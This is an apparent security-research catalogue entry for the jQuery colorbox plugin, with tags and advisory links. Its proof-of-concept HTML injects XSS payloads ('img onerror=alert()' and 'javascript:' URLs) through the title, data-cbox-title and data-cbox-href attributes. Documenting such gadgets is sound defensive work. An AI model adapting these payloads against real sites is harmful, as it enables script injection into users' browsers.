---
description: A customizable lightbox plugin for jQuery.
github: jackmoore/colorbox
gadgets:
  Latest:
    authors:
      - github:Addono
    tags:
      - any-tag
      - data-attr
      - title-attr
      - any-timing
      - chrome-browser
      - firefox-browser
      - safari-browser
    pocs:
      - description: The colorbox library uses HTML from title and data-cbox-title attributes and URLs from the data-cbox-href attribute.
        code: |
          <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
          <script src="https://www.jacklmoore.com/colorbox/jquery.colorbox.js"></script>
          <a class="colorbox" title="&lt;img src=x onerror=alert()&gt;" href="https://example.com">Click me!</a>
          <a class="colorbox" data-cbox-title="&lt;img src=x onerror=alert()&gt;" href="https://example.com">Click me!</a>
          <a class="colorbox" data-cbox-iframe="1" data-cbox-href="javascript:alert()" href="https://example.com">Click me!</a>
          <script>
          $('.colorbox').colorbox();
          </script>
    links:
      - https://github.com/jackmoore/colorbox/issues/846
      - https://github.com/jackmoore/colorbox/pull/847
      - https://security.snyk.io/vuln/npm:jquery-colorbox:20171115
---